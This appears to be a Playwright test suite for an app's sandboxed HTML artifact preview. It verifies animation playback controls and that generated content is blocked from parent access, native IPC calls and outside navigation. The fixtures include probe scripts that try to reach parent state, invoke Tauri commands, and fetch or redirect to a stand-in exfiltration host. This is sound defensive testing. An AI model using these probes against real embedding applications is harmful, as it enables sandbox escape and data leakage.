import { expect, test, type Page } from '@playwright/test';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';

const animation = `<!doctype html><html><head><style>@keyframes drift{to{transform:translateX(100px)}}#css{animation:drift 2s linear infinite}</style></head><body><svg width="400" height="200"><circle id="smil" cx="10" cy="40" r="8"><animate attributeName="cx" values="10;200;10" dur="2s" repeatCount="indefinite"/></circle><circle id="css" cx="10" cy="80" r="8"/></svg><output id="frames">0</output><output id="ticks">0</output><script>let count=0;function step(){document.getElementById('frames').textContent=String(++count);requestAnimationFrame(step)}requestAnimationFrame(step);setInterval(()=>document.getElementById('ticks').textContent=String(Number(document.getElementById('ticks').textContent)+1),25);</script></body></html>`;

type FixtureWindow = typeof window & { fixtureViolations: { directive: string; blockedURI: string }[] };

async function mount(page: Page, html: string, waitForBody = true) {
  await page.route('http://127.0.0.1:1420/', (route) => route.fulfill({ contentType: 'text/html', headers: { 'Content-Security-Policy': "frame-src 'none'; object-src 'none'; base-uri 'self'" }, body: '<!doctype html><html><body></body></html>' }));
  await page.goto('/');
  await page.evaluate(async (value) => {
    const runtime = await import('/src/lib/evaluation/' + 'artifact-document.ts');
    const fixture = window as FixtureWindow;
    fixture.fixtureViolations = [];
    addEventListener('securitypolicyviolation', (event) => {
      fixture.fixtureViolations.push({ directive: event.effectiveDirective, blockedURI: event.blockedURI });
    });
    const host = document.createElement('div');
    const frame = document.createElement('iframe');
    frame.title = 'Artifact sandbox fixture';
    frame.sandbox.add('allow-scripts');
    frame.srcdoc = runtime.createArtifactDocument(value, 'fixture-token');
    host.append(frame);
    document.body.replaceChildren(host);
  }, html);
  const frame = page.frameLocator('iframe');
  if (waitForBody) await expect(frame.locator('body')).toBeVisible();
  return frame;
}

async function attemptScriptNavigation(page: Page, url: string) {
  // A timed redirect can replace the body before Playwright observes mount readiness.
  // Arm the generated script first, then trigger the same navigation after the body is visible.
  await mount(page, `<body>Navigation fixture<script>addEventListener('message',event=>{if(event.source===parent&&event.data==='fixture:navigate')location.href=${JSON.stringify(url)}})</script></body>`);
  await page.evaluate(() => document.querySelector('iframe')!.contentWindow!.postMessage('fixture:navigate', '*'));
}

async function expectBlockedNavigation(page: Page, url: string) {
  const origin = new URL(url).origin;
  await expect.poll(() => page.evaluate((target) => (window as FixtureWindow).fixtureViolations.some((violation) =>
    violation.directive === 'frame-src' && (violation.blockedURI === target || violation.blockedURI.startsWith(`${target}/`))), origin),
  { message: `The embedding policy must block navigation to ${origin}` }).toBe(true);
}

test.beforeEach(async ({ page, request }) => {
  if (process.env.VELA_E2E_LOCAL_PROXY === '1') {
    await page.route('http://127.0.0.1:1420/**', async (route) => {
      const input = route.request();
      if (input.method() !== 'GET') return route.continue();
      const response = await request.get(input.url(), { maxRedirects: 0 });
      const headers = response.headers();
      for (const name of ['connection', 'content-encoding', 'content-length', 'transfer-encoding']) delete headers[name];
      await route.fulfill({ status: response.status(), headers, body: await response.body() });
    });
  }
});

test.afterEach(async ({ page }) => {
  await page.unrouteAll({ behavior: 'wait' });
});

test('HTML preview plays and pauses JavaScript, SMIL and CSS together', async ({ page }) => {
  const frame = await mount(page, animation);
  await expect.poll(async () => Number(await frame.locator('#frames').textContent())).toBeGreaterThan(3);
  await expect.poll(async () => Number(await frame.locator('#ticks').textContent())).toBeGreaterThan(3);
  await expect.poll(() => frame.locator('#smil').evaluate((node) => (node as SVGCircleElement).cx.animVal.value)).toBeGreaterThan(20);
  await expect.poll(() => frame.locator('#css').evaluate((node) => getComputedStyle(node).transform)).not.toBe('none');
  await page.evaluate(() => document.querySelector('iframe')!.contentWindow!.postMessage({ type: 'ahax:artifact-playback', token: 'fixture-token', playing: false }, '*'));
  await expect.poll(() => frame.locator('svg').evaluate((node) => (node as SVGSVGElement).animationsPaused())).toBe(true);
  await expect.poll(() => frame.locator('#css').evaluate((node) => node.getAnimations().map((value) => ({ state: value.playState, pending: value.pending })))).toEqual([{ state: 'paused', pending: false }]);
  const before = await frame.locator('body').evaluate((body) => ({ frames: body.querySelector('#frames')!.textContent, ticks: body.querySelector('#ticks')!.textContent, smil: (body.querySelector('#smil') as SVGCircleElement).cx.animVal.value, css: getComputedStyle(body.querySelector('#css')!).transform }));
  await page.waitForTimeout(150);
  const after = await frame.locator('body').evaluate((body) => ({ frames: body.querySelector('#frames')!.textContent, ticks: body.querySelector('#ticks')!.textContent, smil: (body.querySelector('#smil') as SVGCircleElement).cx.animVal.value, css: getComputedStyle(body.querySelector('#css')!).transform }));
  expect(after).toEqual(before);
  await page.evaluate(() => document.querySelector('iframe')!.contentWindow!.postMessage({ type: 'ahax:artifact-playback', token: 'fixture-token', playing: true }, '*'));
  await expect.poll(async () => Number(await frame.locator('#frames').textContent())).toBeGreaterThan(Number(before.frames) + 3);
});

test('generated HTML cannot read parent state, invoke native commands, open links or fetch externally', async ({ page }) => {
  const sent: string[] = [];
  await page.route('https://artifact-exfil.invalid/**', (route) => { sent.push(route.request().url()); return route.abort(); });
  const frame = await mount(page, `<body><a href="https://artifact-exfil.invalid/link" target="_top">External link</a><script>
    window.probe={};
    try{parent.document.body.dataset.compromised='true';probe.parent=true}catch{probe.parent=false}
    try{parent.__TAURI_INTERNALS__.invoke('get_dashboard');probe.ipc=true}catch{probe.ipc=false}
    try{top.location='https://artifact-exfil.invalid/top';probe.navigation=true}catch{probe.navigation=false}
    fetch('https://artifact-exfil.invalid/fetch').then(()=>probe.fetch=true,()=>probe.fetch=false);
    const image=new Image();image.src='https://artifact-exfil.invalid/image';
    window.open('https://artifact-exfil.invalid/popup');
  </script></body>`);
  await expect.poll(() => frame.locator('body').evaluate(() => (window as unknown as { probe: { fetch?: boolean } }).probe.fetch)).toBe(false);
  const probe = await frame.locator('body').evaluate(() => (window as unknown as { probe: Record<string, boolean> }).probe);
  expect(probe).toMatchObject({ parent: false, ipc: false, navigation: false, fetch: false });
  await frame.getByRole('link').click();
  await page.waitForTimeout(100);
  expect(sent).toEqual([]);
  expect(page.url()).toContain('127.0.0.1:1420');
  expect(page.context().pages()).toHaveLength(1);
});

test('the embedding policy blocks script and meta-refresh navigation out of the preview', async ({ page }) => {
  const sent: string[] = [];
  await page.route('https://artifact-exfil.invalid/**', (route) => { sent.push(route.request().url()); return route.abort(); });
  await attemptScriptNavigation(page, 'https://artifact-exfil.invalid/self');
  await expectBlockedNavigation(page, 'https://artifact-exfil.invalid/self');
  expect(sent).toEqual([]);
  expect(page.url()).toContain('127.0.0.1:1420');
  await mount(page, '<meta http-equiv="refresh" content="0;url=https://artifact-exfil.invalid/refresh"><body>Refresh fixture</body>', false);
  await expectBlockedNavigation(page, 'https://artifact-exfil.invalid/refresh');
  expect(sent).toEqual([]);
  expect(page.url()).toContain('127.0.0.1:1420');
});

test('generated content cannot navigate to another localhost service', async ({ page }) => {
  let received = 0;
  const server = createServer((_request, response) => { received += 1; response.end('unexpected request'); });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/local-service`;
  try {
    await attemptScriptNavigation(page, url);
    await expectBlockedNavigation(page, url);
    expect(received).toBe(0);
    await mount(page, `<meta http-equiv="refresh" content="0;url=${url}"><body>Local refresh</body>`, false);
    await expectBlockedNavigation(page, url);
    expect(received).toBe(0);
  } finally {
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});
